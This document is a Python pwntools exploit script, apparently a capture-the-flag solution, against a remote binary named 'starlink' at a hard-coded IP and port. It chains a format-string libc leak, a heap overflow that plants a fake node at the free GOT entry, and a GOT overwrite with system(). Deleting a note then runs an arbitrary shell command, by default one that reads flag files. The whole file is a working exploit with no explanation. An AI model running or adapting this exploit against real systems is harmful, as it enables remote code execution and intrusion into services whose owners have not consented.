import re
from pathlib import Path
from pwn import *

BASE_DIR = Path(__file__).resolve().parent
context.binary = ELF(str(BASE_DIR / "starlink"), checksec=False)
libc = ELF(str(BASE_DIR / "libc.so.6"), checksec=False)
# nc 
HOST = args.HOST or "194.102.62.166"
PORT = int(args.PORT or 20477)
CMD = (args.CMD or "cat flag*;cat /flag*").encode()

LIBC_LEAK_OFFSET = 0x2A28B
FREE_GOT = 0x404000
FAKE_NODE = FREE_GOT - 0x19


def start():
    if args.LOCAL:
        return process(context.binary.path)
    return remote(HOST, PORT)


def recv_menu(io):
    io.recvuntil(b"5.Exit")
    io.recvuntil(b">")


def leak_libc(io):
    io.recvuntil(b">")
    io.sendline(b"init")
    io.recvuntil(b">")
    io.sendline(b"1")
    io.recvuntil(b"Add a secret word")
    io.sendline(b"x")
    io.recvuntil(b"What is you re name ?")
    io.sendline(b"%29$p")

    blob = io.recvuntil(b"1.Create", timeout=3)
    io.recvuntil(b">")
    m = re.search(rb"welcome (0x[0-9a-fA-F]+)", blob)
    if not m:
        log.failure("Could not parse libc leak")
        log.info(blob.decode("latin1", "ignore"))
        raise SystemExit(1)
    return int(m.group(1), 16)


def create(io, name, content):
    io.sendline(b"1")
    io.recvuntil(b"Add a name (max 24):")
    io.sendline(name)
    io.recvuntil(b"Add content (max 256):")
    io.sendline(content)
    recv_menu(io)


def update(io, name, data):
    io.sendline(b"2")
    io.recvuntil(b"Enter the name you want to update:")
    io.sendline(name)
    io.recvuntil(b"Give the new content :")
    io.send(data + b"\n")
    recv_menu(io)


def delete(io, name):
    io.sendline(b"3")
    io.recvuntil(b"Name to delete:")
    io.sendline(name)


def main():
    if len(CMD) > 24:
        log.error("CMD must be <= 24 bytes.")

    io = start()

    leak = leak_libc(io)
    libc.address = leak - LIBC_LEAK_OFFSET
    system = libc.sym.system
    log.success(f"libc leak   : {hex(leak)}")
    log.success(f"libc base   : {hex(libc.address)}")
    log.success(f"system addr : {hex(system)}")

    create(io, CMD, b"A")
    update(io, CMD, b"A" * 0x107 + p64(FAKE_NODE))
    update(io, b"", p64(system))
    delete(io, CMD)

    print(io.recvrepeat(3).decode("latin1", "ignore"))
    io.close()


if __name__ == "__main__":
    main()
